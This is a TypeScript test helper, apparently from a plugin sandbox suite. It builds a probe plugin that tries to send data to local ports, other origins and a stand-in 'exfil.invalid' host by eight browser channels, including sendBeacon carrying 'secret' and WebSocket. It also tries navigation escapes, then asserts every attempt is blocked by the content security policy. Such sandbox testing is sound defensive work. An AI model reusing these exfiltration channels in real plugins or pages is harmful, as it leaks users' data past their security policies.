import { expect, type ConnectionSink } from "../harness"

export type Target = { readonly name: string; readonly http: string; readonly socket: string }

export const KINDS = ["fetch", "xhr", "websocket", "eventsource", "beacon", "image", "frame", "prefetch"] as const

const SENT_ONLY: ReadonlySet<string> = new Set(["beacon", "frame", "prefetch"])

export const PROBE = `async (targets) => {
  const settle = (start) => new Promise((resolve) => {
    const timer = setTimeout(() => resolve("pending"), 5000)
    const done = (outcome) => () => {
      clearTimeout(timer)
      resolve(outcome)
    }
    try {
      start(done("reached"), done("blocked"))
    } catch {
      done("blocked")()
    }
  })
  const outcomes = []
  for (const target of targets) {
    const at = (via) => target.http + "/exfil?via=" + via
    outcomes.push([target.name, "fetch", await fetch(at("fetch"), { mode: "no-cors" }).then(() => "reached", () => "blocked")])
    outcomes.push([target.name, "xhr", await settle((reached, blocked) => {
      const request = new XMLHttpRequest()
      request.onload = reached
      request.onerror = blocked
      request.open("GET", at("xhr"))
      request.send()
    })])
    outcomes.push([target.name, "websocket", await settle((reached, blocked) => {
      const socket = new WebSocket(target.socket + "/exfil?via=websocket")
      socket.onopen = () => { socket.close(); reached() }
      socket.onerror = blocked
    })])
    outcomes.push([target.name, "eventsource", await settle((reached, blocked) => {
      const source = new EventSource(at("eventsource"))
      source.onopen = () => { source.close(); reached() }
      source.onerror = () => { source.close(); blocked() }
    })])
    outcomes.push([target.name, "beacon", navigator.sendBeacon(at("beacon"), "secret") ? "queued" : "refused"])
    outcomes.push([target.name, "image", await settle((reached, blocked) => {
      const image = new Image()
      image.onload = reached
      image.onerror = blocked
      image.src = at("image")
    })])
    const frame = document.createElement("iframe")
    frame.src = at("frame")
    document.body.append(frame)
    outcomes.push([target.name, "frame", "sent"])
    const prefetch = document.createElement("link")
    prefetch.rel = "prefetch"
    prefetch.href = at("prefetch")
    document.head.append(prefetch)
    outcomes.push([target.name, "prefetch", "sent"])
  }
  return outcomes.map((outcome) => outcome.join(" "))
}`

export function targetsFor(serverUrl: string, sink: ConnectionSink): Target[] {
  const own = new URL(serverUrl)
  const otherName = own.hostname === "localhost" ? "127.0.0.1" : "localhost"
  return [
    { name: "local-port", http: sink.url, socket: `ws://127.0.0.1:${sink.port}` },
    { name: "other-origin", http: `http://localhost:${sink.port}`, socket: `ws://localhost:${sink.port}` },
    { name: "own-server-by-another-name", http: `http://${otherName}:${own.port}`, socket: `ws://${otherName}:${own.port}` },
    { name: "internet", http: "https://exfil.invalid", socket: "wss://exfil.invalid" },
  ]
}

export function expectEveryAttemptBlocked(outcomes: readonly string[], targets: readonly Target[]) {
  const expected = targets.flatMap((target) =>
    KINDS.map((kind) => (SENT_ONLY.has(kind) ? `${target.name} ${kind}` : `${target.name} ${kind} blocked`)),
  )
  const comparable = outcomes.map((line) => {
    const [name, kind] = line.split(" ")
    return SENT_ONLY.has(kind ?? "") ? `${name} ${kind}` : line
  })
  expect(comparable).toEqual(expected)
}

function violatedOrigins(violations: readonly string[], directive: string) {
  return new Set(
    violations
      .filter((line) => line.startsWith(`${directive} `))
      .map((line) => line.slice(directive.length + 1))
      .filter((uri) => URL.canParse(uri))
      .map((uri) => new URL(uri).origin),
  )
}

export type ImagePolicy = "https images load" | "no outside image"

export const OUTSIDE_IMAGE = "https://example.invalid/x.png"

export function expectEveryOriginViolated(violations: readonly string[], targets: readonly Target[], imagePolicy: ImagePolicy) {
  const connected = violatedOrigins(violations, "connect-src")
  const images = violatedOrigins(violations, "img-src")
  const frames = violatedOrigins(violations, "frame-src")
  for (const target of targets) {
    const origin = new URL(target.http).origin
    expect(connected, `${target.name} connect-src`).toContain(origin)
    expect(connected, `${target.name} socket`).toContain(new URL(target.socket).origin)
    if (imagePolicy === "https images load" && origin.startsWith("https:")) expect(images, `${target.name} img-src`).not.toContain(origin)
    else expect(images, `${target.name} img-src`).toContain(origin)
    expect(frames, `${target.name} frame-src`).toContain(origin)
  }
}

export function expectOutsideImage(violations: readonly string[], imagePolicy: ImagePolicy) {
  const refused = violations.includes(`img-src ${OUTSIDE_IMAGE}`)
  expect(refused, `${OUTSIDE_IMAGE} refused by img-src`).toBe(imagePolicy === "no outside image")
}

export function probePlugin(targets: readonly Target[], leave: string) {
  return `import { createSignal, For } from "solid-js"
import { definePlugin, type PluginApi } from "@claxedo/plugin-api"

const TARGETS = ${JSON.stringify(targets)}
const OUTSIDE_IMAGE = ${JSON.stringify(OUTSIDE_IMAGE)}
const LEAVE = ${JSON.stringify(leave)}
const probe: (targets: typeof TARGETS) => Promise<string[]> = ${PROBE}
const [violations, setViolations] = createSignal<string[]>([])
document.addEventListener("securitypolicyviolation", (event) => setViolations((lines) => [...lines, event.effectiveDirective + " " + event.blockedURI]))

function Probe(props: { readonly api: PluginApi }) {
  const [outcomes, setOutcomes] = createSignal<string[]>([])
  const add = (line: string) => setOutcomes((lines) => [...lines, line])
  void props.api.server.fetch("/api/claxedo/projects").then((response) => add("server " + response.status), (error) => add("server failed " + String(error)))
  void probe(TARGETS).then((lines) => lines.forEach(add))
  return (
    <section>
      <img src={OUTSIDE_IMAGE} alt="Outside image" />
      <ul aria-label="Outcomes"><For each={outcomes()}>{(line) => <li>{line}</li>}</For></ul>
      <ul aria-label="Violations"><For each={violations()}>{(line) => <li>{line}</li>}</For></ul>
      <a href={LEAVE + "/clicked"}>Plugin docs</a>
      <button type="button" onClick={() => props.api.pages.open("leave")}>Leave</button>
    </section>
  )
}

function Leave() {
  queueMicrotask(() => {
    const anchor = document.createElement("a")
    anchor.href = LEAVE + "/synthetic-click"
    anchor.target = "_blank"
    document.body.append(anchor)
    anchor.click()
    window.open(LEAVE + "/window-open")
    location.href = LEAVE + "/navigate"
  })
  return <p>Leaving</p>
}

export default definePlugin({
  activate(api) {
    api.pages.register({ id: "probe", path: "/network-probe", title: "Network probe", render: () => <Probe api={api} /> })
    api.pages.register({ id: "leave", path: "/network-leave", title: "Network leave", render: () => <Leave /> })
    api.sidebar.item({ id: "probe", label: "Network probe", pageId: "probe" })
  },
})
`
}
